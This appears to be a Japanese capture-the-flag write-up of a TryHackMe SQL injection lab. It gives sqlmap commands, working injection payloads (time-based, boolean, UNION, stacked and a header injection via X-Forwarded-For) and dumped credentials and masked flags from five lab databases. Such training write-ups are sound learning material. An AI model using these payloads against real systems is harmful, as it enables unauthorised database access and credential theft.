#### 1
```
sqlmap -r s.req -p username --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

---------- snip ----------

[23:28:31] [INFO] parsing HTTP request from 's.req'
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=name' AND (SELECT 9451 FROM (SELECT(SLEEP(5)))Fanc) AND 'BhIX'='BhIX&password=pass
---

---------- snip ----------

Database: sqhell_2
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | icantrememberthispasswordcanyou | admin    |
+----+---------------------------------+----------+
```
![image](https://user-images.githubusercontent.com/6504854/234910802-dc397064-7469-494b-bd79-717b1d183642.png)



#### 2
Hintを読むとIPを記録してるとかいてある。X-forwarded-forを追加したところ、Sleepがきいてる。

```
X-Forwarded-For:127.0.0.1';select+sleep(3);#
```

```
sqlmap --dbms mysql --headers="X-forwarded-for:127.0.0.1" -u http://10.10.56.57/terms-and-conditions --dump --risk 1 --level 1
        ___
       __H__                                                                                    
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                        
|_ -| . [)]     | .'| . |                                                                       
|___|_  [.]_|_|_|__,|  _|                                                                       
      |_|V...       |_|   https://sqlmap.org                                                    

---------- snip ----------
---
Parameter: X-forwarded-for #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1' AND (SELECT 2673 FROM (SELECT(SLEEP(5)))VFMf) AND 'pUCP'='pUCP
---
Database: sqhell_1
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG2:C------------------------------5} |
+----+---------------------------------------------+

```

#### 3

Registerできないので、ソースを見るとregister/user-checkに飛ぶようなので、そちらを確認する。

![image](https://user-images.githubusercontent.com/6504854/235073351-4790508f-0804-4593-8144-02c2eba69112.png)

![image](https://user-images.githubusercontent.com/6504854/234926996-5433dd7a-c221-42da-ba16-760861ec12d1.png)

![image](https://user-images.githubusercontent.com/6504854/234927091-e49433eb-dd0d-439e-bf9e-a302d0df5fa8.png)

```
sqlmap --dbms mysql -u http://10.10.56.57/register/user-check?username=admin -p username --dump

---
Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 8387=8387 AND 'joNK'='joNK

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5498 FROM (SELECT(SLEEP(5)))bqcH) AND 'uivi'='uivi
---
Database: sqhell_3
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG3:9------------------------------8} |
+----+---------------------------------------------+

```

#### 4
数値演算がうごく。
![image](https://user-images.githubusercontent.com/6504854/234930560-452e84c4-385f-4262-98eb-837e6c47d50f.png)
![image](https://user-images.githubusercontent.com/6504854/234930659-5a9c4fed-8472-45a9-b520-96a33b6714fd.png)

SQLmapでとれず。
```
┌──(kali🦝kali)-[~]
└─$ sqlmap -dbms mysql -u http://10.10.56.57/user?id=1 -p id --dump --flush-session

----------------- snip ------------------

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9655=9655

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6365 FROM (SELECT(SLEEP(5)))HOws)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-8134 UNION ALL SELECT CONCAT(0x717a786a71,0x486a4c706e684179424c69766c464b55436e55684b55734c685273484843714e73545a4d75767458,0x71766a6a71),NULL,NULL-- -
---
Database: sqhell_4
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | password | admin    |
+----+----------+----------+
```
usersテーブルは3カラムでflagはない。今までの結果からおそらくflagテーブル(id,flagの2カラム)があるのではというあてずっぽうでガチャガチャする。

SQLmapの結果のUnionSelectの文を元にガチャガチャする。

![image](https://user-images.githubusercontent.com/6504854/234960030-1ab47f3a-d563-4c3d-8c07-c497bffbce08.png)

この問題が一番難しく、答え見て修正した。

#### 5
コメントとSleepがきく。

![image](https://user-images.githubusercontent.com/6504854/234930133-23f86b71-c999-4987-a9b1-5c10609180b7.png)

![image](https://user-images.githubusercontent.com/6504854/234930304-0cae3595-d827-4e88-aec1-7a0a6f680333.png)

```
$ sqlmap --dbms mysql -u http://10.10.56.57/post?id=1 -p id --dump               
 
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9968=9968

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x716a627871,(SELECT (ELT(7296=7296,1))),0x7176767a71),7296)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1979 FROM (SELECT(SLEEP(5)))kSmf)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-6989 UNION ALL SELECT NULL,NULL,CONCAT(0x716a627871,0x5a4348716f52576e476b675742424a5842636765504a416e676c624a4143455976787957414a4370,0x7176767a71),NULL-- -
---
Database: sqhell_5
Table: posts
Database: sqhell_5
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG5:B------------------------------8} |
+----+---------------------------------------------+
```

まいどツールだのみ。

